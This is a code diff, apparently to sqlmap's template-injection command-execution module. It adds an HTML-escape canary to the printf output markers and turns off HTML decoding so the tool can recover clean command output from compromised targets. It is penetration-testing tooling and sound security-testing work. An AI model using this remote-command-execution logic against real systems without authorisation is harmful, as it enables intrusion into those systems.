@@ -15,7 +15,9 @@ from lib.core.common import beep
 from lib.core.common import randomInt
 from lib.core.common import randomStr
 from lib.core.convert import getUnicode
+from lib.core.convert import htmlUnescape
 from lib.core.data import conf
+from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.enums import CUSTOM_LOGGING
 from lib.core.enums import HTTP_HEADER
@@ -816,7 +818,8 @@ def _winChallenge(a, b):
 
 def _unixFramed(cmd, sa, sb, ea, eb):
     # printf concatenates its two %s (sa+sb / ea+eb) at runtime; the request carries them separated
-    return "printf %%s%%s %s %s; %s; printf %%s%%s %s %s" % (sa, sb, cmd, ea, eb)
+    # Note: a '<' canary is printed right after the start marker - it reveals whether the engine HTML-escapes the output
+    return "printf %%s%%s %s %s; printf %%s \\<; %s; printf %%s%%s %s %s" % (sa, sb, cmd, ea, eb)
 
 
 def _winFramed(cmd, sa, sb, ea, eb):
@@ -1017,11 +1020,24 @@ def _executeCommand(place, parameter, engine, cmd):
         framedCmd = _escapeSingleQuoted(framed(cmd, sa, sb, ea, eb))
         for payloadTemplate, description in engine.rcePayloads:
             payload = payloadTemplate.replace("{CMD}", framedCmd)
-            page = getUnicode(_send(place, parameter, original + payload) or "")
+
+            # Note: raw page (i.e. without sqlmap's generic decoding, which would e.g. turn a genuine '%41' into 'A')
+            disableHtmlDecoding = kb.disableHtmlDecoding
+            kb.disableHtmlDecoding = _family == "unix"
+            try:
+                page = getUnicode(_send(place, parameter, original + payload) or "")
+            finally:
+                kb.disableHtmlDecoding = disableHtmlDecoding
+
             out = _framedOutput(page, start, end)
             # Note: without a shell (e.g. Java's Runtime.exec) printf recycles its format over the rest of the (unexecuted) command
             # line (e.g. ';id;printf%s%s'), "reproducing" both markers by itself - leftover format is the telltale
             if out is not None and "%s%s" not in out:
+                if _family == "unix":
+                    if out.startswith("&lt;"):      # engine HTML-escaped the output (e.g. Jinja2 with autoescaping)
+                        out = htmlUnescape(out[len("&lt;"):]).strip()
+                    elif out.startswith("<"):       # raw output
+                        out = out[len("<"):].strip()
                 conf.dumper.singleString("\nos-shell (%s) [%s]:\n%s" % (cmd, description, out))
                 return
 
